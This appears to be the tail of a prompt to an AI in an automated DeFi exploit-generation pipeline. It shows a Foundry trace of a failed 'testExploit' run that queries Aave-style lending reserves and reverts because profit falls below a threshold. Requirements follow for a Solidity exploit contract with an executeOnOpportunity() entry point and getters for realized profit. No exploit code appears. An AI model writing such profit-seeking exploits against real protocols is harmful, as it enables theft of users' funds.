    │   ├─ [3756] 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5::getReserveData(0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71) [staticcall]
    │   │   ├─ [3158] 0xfD11AbA71c06061F446ADe4eec057179F19C23C4::getReserveData(0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 3291009114642412084310341054653865339783267524416718414697496168150080844 [3.291e72] }), liquidityIndex: 1008467806592268958944240336 [1.008e27], currentLiquidityRate: 386166268592274164891590 [3.861e23], variableBorrowIndex: 1015171788913021157930020652 [1.015e27], currentVariableBorrowRate: 4608459646787549831212694 [4.608e24], currentStableBorrowRate: 50576057455848443728901586 [5.057e25], lastUpdateTimestamp: 1699099763 [1.699e9], id: 1, aTokenAddress: 0xE6B683868D1C168Da88cfe5081E34d9D80E4D1a6, stableDebtTokenAddress: 0xe26cF5a1c0e5D4B63A9c6658350849A62374d22b, variableDebtTokenAddress: 0x93c457512aAe663F36e555d2ad62E1dEe9d91836, interestRateStrategyAddress: 0x4d9293C164b6b21f25cfE742c9581bed7f2Ac6b8, accruedToTreasury: 18995270919503826485 [1.899e19], unbacked: 0, isolationModeTotalDebt: 0 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 3291009114642412084310341054653865339783267524416718414697496168150080844 [3.291e72] }), liquidityIndex: 1008467806592268958944240336 [1.008e27], currentLiquidityRate: 386166268592274164891590 [3.861e23], variableBorrowIndex: 1015171788913021157930020652 [1.015e27], currentVariableBorrowRate: 4608459646787549831212694 [4.608e24], currentStableBorrowRate: 50576057455848443728901586 [5.057e25], lastUpdateTimestamp: 1699099763 [1.699e9], id: 1, aTokenAddress: 0xE6B683868D1C168Da88cfe5081E34d9D80E4D1a6, stableDebtTokenAddress: 0xe26cF5a1c0e5D4B63A9c6658350849A62374d22b, variableDebtTokenAddress: 0x93c457512aAe663F36e555d2ad62E1dEe9d91836, interestRateStrategyAddress: 0x4d9293C164b6b21f25cfE742c9581bed7f2Ac6b8, accruedToTreasury: 18995270919503826485 [1.899e19], unbacked: 0, isolationModeTotalDebt: 0 })
    │   ├─ [887] 0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71::balanceOf(0xE6B683868D1C168Da88cfe5081E34d9D80E4D1a6) [staticcall]
    │   │   └─ ← [Return] 10001466755107579871763 [1e22]
    │   ├─ [1279] 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5::getConfiguration(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   ├─ [727] 0xfD11AbA71c06061F446ADe4eec057179F19C23C4::getConfiguration(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 28544953854119197621165719407436868087941408759616 [2.854e49] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 28544953854119197621165719407436868087941408759616 [2.854e49] })
    │   ├─ [1279] 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5::getConfiguration(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   ├─ [727] 0xfD11AbA71c06061F446ADe4eec057179F19C23C4::getConfiguration(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 28544953854119197621165719407436868087941408759616 [2.854e49] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 28544953854119197621165719407436868087941408759616 [2.854e49] })
    │   └─ ← [Stop]
    ├─ [525] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2545] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 15.03s (14.76s CPU time)

Ran 1 test suite in 15.11s (15.03s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 503110)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
